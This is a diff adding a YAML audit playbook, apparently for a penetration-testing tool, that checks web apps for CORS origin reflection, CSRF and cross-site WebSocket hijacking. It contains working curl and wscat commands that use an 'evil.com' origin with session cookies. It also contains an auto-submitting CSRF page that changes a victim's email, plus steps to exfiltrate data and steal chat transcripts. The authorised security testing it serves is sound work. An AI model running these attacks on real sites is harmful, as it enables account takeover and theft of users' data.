@@ -1,0 +1,64 @@
+id: client-side
+name: Client-Side Security (CORS, CSRF, Clickjacking & WebSockets)
+category: web
+description: Audit client-side web application security controls including Cross-Origin Resource Sharing (CORS) misconfigurations, Cross-Site Request Forgery (CSRF), Clickjacking (X-Frame-Options), and WebSocket security (CSWSH).
+port_triggers:
+  - 80
+  - 443
+  - 8080
+  - 8443
+service_triggers:
+  - http
+  - https
+  - web
+tags:
+  - cors
+  - csrf
+  - clickjacking
+  - websocket
+  - cswsh
+  - client-side
+steps:
+  - id: client-cors-misconfiguration
+    title: CORS Origin Reflection & Null Origin Audit
+    phase: enumeration
+    purpose: Test whether the API reflects arbitrary Origin headers with Access-Control-Allow-Credentials true or accepts Origin null allowing cross-origin data extraction.
+    command: "curl -s -I -X GET http://{{TARGET}}:{{PORT|80}}/api/user/profile -H 'Origin: https://evil.com' -H 'Cookie: {{SESSION_COOKIE}}'; curl -s -I -X GET http://{{TARGET}}:{{PORT|80}}/api/user/profile -H 'Origin: null' -H 'Cookie: {{SESSION_COOKIE}}'"
+    expected_output:
+      - 'Access-Control-Allow-Origin: https://evil.com'
+      - 'Access-Control-Allow-Credentials: true'
+    common_mistakes:
+      - Ensure you test authenticated endpoints where private PII or API tokens are returned.
+    if_success: Critical CORS misconfiguration found! Host exploit PoC on attacker server to exfiltrate user data.
+    if_failure: Origin strictly whitelisted. Test prefix/suffix bypasses.
+    references:
+      - https://portswigger.net/web-security/cors
+
+  - id: client-csrf-poc-generation
+    title: Cross-Site Request Forgery (CSRF) PoC
+    phase: exploitation
+    purpose: Verify if state-changing POST/PUT requests lack anti-CSRF tokens and lack SameSite=Strict/Lax cookie flags.
+    command: "cat << 'EOF' > csrf_poc.html\n<html>\n  <body>\n    <h1>CSRF PoC</h1>\n    <form action=\"http://{{TARGET}}:{{PORT|80}}/api/email/change\" method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>document.forms[0].submit();</script>\n  </body>\n</html>\nEOF\npython3 -m http.server 8000"
+    expected_output:
+      - 'Serving HTTP on 0.0.0.0 port 8000 ...'
+    common_mistakes:
+      - If endpoint accepts JSON, test if content-type can be relaxed or if CORS preflight is bypassed (text/plain or multipart).
+    if_success: Target account email or password modified upon victim visiting attacker page!
+    if_failure: Protected by CSRF tokens or SameSite=Lax.
+    references:
+      - https://portswigger.net/web-security/csrf
+
+  - id: client-websocket-cswsh
+    title: Cross-Site WebSocket Hijacking (CSWSH) & Injection
+    phase: exploitation
+    purpose: Test if WebSocket handshake relies solely on session cookies without verifying the Origin header, enabling cross-origin WebSocket message interception.
+    command: "wscat -c ws://{{TARGET}}:{{PORT|80}}/ws/chat --header 'Origin: https://evil.com' --header 'Cookie: {{SESSION_COOKIE}}'"
+    expected_output:
+      - 'Connected (press CTRL+C to quit)'
+      - '< {"type": "history", "messages": [...]}'
+    common_mistakes:
+      - Use wss:// for TLS encrypted WebSocket endpoints.
+    if_success: WebSocket connection established with arbitrary Origin! Steal real-time notifications or chat transcripts.
+    if_failure: Server rejected connection due to mismatched Origin header or missing CSRF token in handshake query.
+    references:
+      - https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
